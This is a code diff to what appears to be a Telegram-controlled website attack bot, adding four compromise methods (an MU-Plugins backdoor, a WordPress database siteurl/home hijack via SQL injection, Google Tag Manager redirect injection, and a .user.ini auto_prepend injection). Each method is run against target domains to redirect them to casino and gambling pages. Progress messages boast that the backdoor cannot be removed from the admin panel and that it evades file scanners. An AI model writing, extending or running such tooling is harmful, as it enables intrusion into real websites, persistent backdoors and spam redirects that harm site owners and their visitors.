@@ -3782,6 +3782,10 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       const ALL_METHODS: AttackMethodDef[] = [
         { id: "pipeline", name: "Unified Attack Pipeline", phase: "exploit", icon: "💥", keywords: ["upload", "put", "post", "webdav", "writable", "form", "multipart"] },
         { id: "cloaking", name: "PHP Cloaking Injection", phase: "inject", icon: "💊", keywords: ["cloaking", "php", "inject", "htaccess", "functions.php"] },
+        { id: "mu_plugins", name: "MU-Plugins Backdoor", phase: "inject", icon: "💀", keywords: ["mu-plugin", "must-use", "auto-load", "mu_plugins", "wp-content/mu"] },
+        { id: "db_siteurl", name: "DB siteurl/home Hijack", phase: "hijack", icon: "🗄️", keywords: ["siteurl", "home", "wp_options", "database", "db_option", "option_value"] },
+        { id: "gtm_inject", name: "GTM Redirect Inject", phase: "inject", icon: "🏷️", keywords: ["gtm", "tag manager", "google tag", "analytics", "header inject", "footer inject", "wpcode"] },
+        { id: "auto_prepend", name: "auto_prepend .user.ini", phase: "inject", icon: "⚙️", keywords: ["user.ini", "auto_prepend", "php.ini", "prepend_file", "php_value", "php-fpm"] },
         { id: "hijack", name: "Hijack Redirect", phase: "hijack", icon: "🔓", keywords: ["credential", "brute", "xmlrpc", "ftp", "mysql", "phpmyadmin", "cpanel", "takeover"] },
         { id: "advanced", name: "Advanced Deploy (5 เทคนิค)", phase: "exploit", icon: "🚀", keywords: ["parasite", "doorway", "play store", "apk", "seo"] },
         { id: "redirect", name: "Redirect Takeover ตรง", phase: "hijack", icon: "🎯", keywords: ["redirect", "301", "302", "meta refresh", "javascript redirect"] },
@@ -3822,8 +3826,8 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         );
       } else {
         // Fallback: fixed order
-        methodOrder = ["pipeline", "cloaking", "hijack", "advanced", "redirect"];
-        await narrator.addAnalysis(`⚠️ ไม่มีข้อมูล scan — ใช้ลำดับเริ่มต้น: Pipeline → Cloaking → Hijack → Advanced → Redirect`);
+        methodOrder = ["pipeline", "cloaking", "mu_plugins", "db_siteurl", "gtm_inject", "auto_prepend", "hijack", "advanced", "redirect"];
+        await narrator.addAnalysis(`⚠️ ไม่มีข้อมูล scan — ใช้ลำดับเริ่มต้น: Pipeline → Cloaking → MU-Plugins → DB Hijack → GTM → auto_prepend → Hijack → Advanced → Redirect`);
       }
       
       // Execute methods in AI-determined order
@@ -3985,6 +3989,148 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             } else {
               failedMethods.push(`Advanced (${deployment.deployedFiles}/${deployment.totalFiles} deployed, 0 verified)`);
               await narrator.addAnalysis(`❌ Advanced Deploy ล้มเหลว — ลองวิธีถัดไป...`);
+            }
+            
+          } else if (methodId === "mu_plugins") {
+            // ── MU-Plugins Backdoor Redirect ──
+            const { runShelllessAttacks } = await import("./shellless-attack-engine");
+            const muStep = await narrator.addStep("💀 MU-Plugin Backdoor Inject");
+            
+            // Build config from vuln scan data
+            const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
+              targetUrl: `https://${domain}`,
+              redirectUrl,
+              seoKeywords: ["casino", "gambling", "slots"],
+              cmsType: vulnScanResult?.cms?.type || undefined,
+              wpRestApi: vulnScanResult?.cms?.type === "wordpress",
+              wpXmlRpc: vulnScanResult?.exposedPanels?.some((p: any) => p.url?.includes("xmlrpc")),
+              sqliEndpoint: vulnScanResult?.attackVectors?.find((v: any) => v.technique?.toLowerCase().includes("sqli"))?.targetPath || undefined,
+              sqliParam: "id",
+              configFiles: vulnScanResult?.writablePaths?.map((p: any) => ({ path: typeof p === "string" ? p : p.path || p.url })) || [],
+              onProgress: async (_method: string, detail: string) => {
+                try { await narrator.addStep(detail.substring(0, 60)); } catch {}
+              },
+            };
+
+            // Import and run only the muPluginsInject method via runShelllessAttacks
+            // We call the full runner but the method will be included
+            const muResults = await runShelllessAttacks(shelllessConfig);
+            const muSuccess = muResults.find(r => r.method === "mu_plugins_inject" && r.success);
+            
+            if (muSuccess) {
+              fullChainSuccess = true;
+              successMethod = "MU-Plugins Backdoor";
+              successUrl = muSuccess.injectedUrl || "";
+              await narrator.updateStep(muStep, "done", `✅ ${muSuccess.detail}`, Date.now() - methodStart);
+              await narrator.addAnalysis(`✅ MU-Plugin backdoor inject สำเร็จ! ไฟล์ auto-load ทุกครั้ง ปิดไม่ได้จาก admin panel`);
+            } else {
+              const muResult = muResults.find(r => r.method === "mu_plugins_inject");
+              failedMethods.push(`MU-Plugins (${muResult?.detail?.substring(0, 40) || "failed"})`);
+              await narrator.updateStep(muStep, "failed", muResult?.detail?.substring(0, 60) || "failed", Date.now() - methodStart);
+              await narrator.addAnalysis(`❌ MU-Plugin inject ล้มเหลว — ลองวิธีถัดไป...`);
+            }
+            
+          } else if (methodId === "db_siteurl") {
+            // ── DB siteurl/home Hijack ──
+            const { runShelllessAttacks } = await import("./shellless-attack-engine");
+            const dbStep = await narrator.addStep("🗄️ DB siteurl/home Hijack");
+            
+            const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
+              targetUrl: `https://${domain}`,
+              redirectUrl,
+              seoKeywords: ["casino", "gambling", "slots"],
+              cmsType: vulnScanResult?.cms?.type || undefined,
+              wpRestApi: vulnScanResult?.cms?.type === "wordpress",
+              wpXmlRpc: vulnScanResult?.exposedPanels?.some((p: any) => p.url?.includes("xmlrpc")),
+              sqliEndpoint: vulnScanResult?.attackVectors?.find((v: any) => v.technique?.toLowerCase().includes("sqli"))?.targetPath || undefined,
+              sqliParam: "id",
+              onProgress: async (_method: string, detail: string) => {
+                try { await narrator.addStep(detail.substring(0, 60)); } catch {}
+              },
+            };
+
+            const dbResults = await runShelllessAttacks(shelllessConfig);
+            const dbSuccess = dbResults.find(r => r.method === "db_siteurl_hijack" && r.success);
+            
+            if (dbSuccess) {
+              fullChainSuccess = true;
+              successMethod = "DB siteurl/home Hijack";
+              successUrl = dbSuccess.injectedUrl || "";
+              await narrator.updateStep(dbStep, "done", `✅ ${dbSuccess.detail}`, Date.now() - methodStart);
+              await narrator.addAnalysis(`✅ siteurl/home hijack สำเร็จ! ทั้งเว็บ redirect ทันที ไม่ต้องแก้ไฟล์`);
+            } else {
+              const dbResult = dbResults.find(r => r.method === "db_siteurl_hijack");
+              failedMethods.push(`DB Hijack (${dbResult?.detail?.substring(0, 40) || "failed"})`);
+              await narrator.updateStep(dbStep, "failed", dbResult?.detail?.substring(0, 60) || "failed", Date.now() - methodStart);
+              await narrator.addAnalysis(`❌ DB siteurl/home hijack ล้มเหลว — ลองวิธีถัดไป...`);
+            }
+            
+          } else if (methodId === "gtm_inject") {
+            // ── GTM Redirect Injection ──
+            const { runShelllessAttacks } = await import("./shellless-attack-engine");
+            const gtmStep = await narrator.addStep("🏷️ GTM Redirect Injection");
+            
+            const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
+              targetUrl: `https://${domain}`,
+              redirectUrl,
+              seoKeywords: ["casino", "gambling", "slots"],
+              cmsType: vulnScanResult?.cms?.type || undefined,
+              wpRestApi: vulnScanResult?.cms?.type === "wordpress",
+              sqliEndpoint: vulnScanResult?.attackVectors?.find((v: any) => v.technique?.toLowerCase().includes("sqli"))?.targetPath || undefined,
+              sqliParam: "id",
+              onProgress: async (_method: string, detail: string) => {
+                try { await narrator.addStep(detail.substring(0, 60)); } catch {}
+              },
+            };
+
+            const gtmResults = await runShelllessAttacks(shelllessConfig);
+            const gtmSuccess = gtmResults.find(r => r.method === "gtm_inject" && r.success);
+            
+            if (gtmSuccess) {
+              fullChainSuccess = true;
+              successMethod = "GTM Redirect Inject";
+              successUrl = gtmSuccess.injectedUrl || "";
+              await narrator.updateStep(gtmStep, "done", `✅ ${gtmSuccess.detail}`, Date.now() - methodStart);
+              await narrator.addAnalysis(`✅ GTM inject สำเร็จ! โหลด JS จาก trusted domain — bypass file scanner`);
+            } else {
+              const gtmResult = gtmResults.find(r => r.method === "gtm_inject");
+              failedMethods.push(`GTM (${gtmResult?.detail?.substring(0, 40) || "failed"})`);
+              await narrator.updateStep(gtmStep, "failed", gtmResult?.detail?.substring(0, 60) || "failed", Date.now() - methodStart);
+              await narrator.addAnalysis(`❌ GTM inject ล้มเหลว — ลองวิธีถัดไป...`);
+            }
+            
+          } else if (methodId === "auto_prepend") {
+            // ── auto_prepend_file via .user.ini ──
+            const { runShelllessAttacks } = await import("./shellless-attack-engine");
+            const prependStep = await narrator.addStep("⚙️ auto_prepend .user.ini Inject");
+            
+            const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
+              targetUrl: `https://${domain}`,
+              redirectUrl,
+              seoKeywords: ["casino", "gambling", "slots"],
+              cmsType: vulnScanResult?.cms?.type || undefined,
+              wpRestApi: vulnScanResult?.cms?.type === "wordpress",
+              sqliEndpoint: vulnScanResult?.attackVectors?.find((v: any) => v.technique?.toLowerCase().includes("sqli"))?.targetPath || undefined,
+              sqliParam: "id",
+              onProgress: async (_method: string, detail: string) => {
+                try { await narrator.addStep(detail.substring(0, 60)); } catch {}
+              },
+            };
+
+            const prependResults = await runShelllessAttacks(shelllessConfig);
+            const prependSuccess = prependResults.find(r => r.method === "auto_prepend_inject" && r.success);
+            
+            if (prependSuccess) {
+              fullChainSuccess = true;
+              successMethod = "auto_prepend .user.ini";
+              successUrl = prependSuccess.injectedUrl || "";
+              await narrator.updateStep(prependStep, "done", `✅ ${prependSuccess.detail}`, Date.now() - methodStart);
+              await narrator.addAnalysis(`✅ auto_prepend inject สำเร็จ! PHP include redirect ก่อนทุก script — ทำงานกับทุกหน้า`);
+            } else {
+              const prependResult = prependResults.find(r => r.method === "auto_prepend_inject");
+              failedMethods.push(`auto_prepend (${prependResult?.detail?.substring(0, 40) || "failed"})`);
+              await narrator.updateStep(prependStep, "failed", prependResult?.detail?.substring(0, 60) || "failed", Date.now() - methodStart);
+              await narrator.addAnalysis(`❌ auto_prepend inject ล้มเหลว — ลองวิธีถัดไป...`);
             }
             
           } else if (methodId === "redirect") {
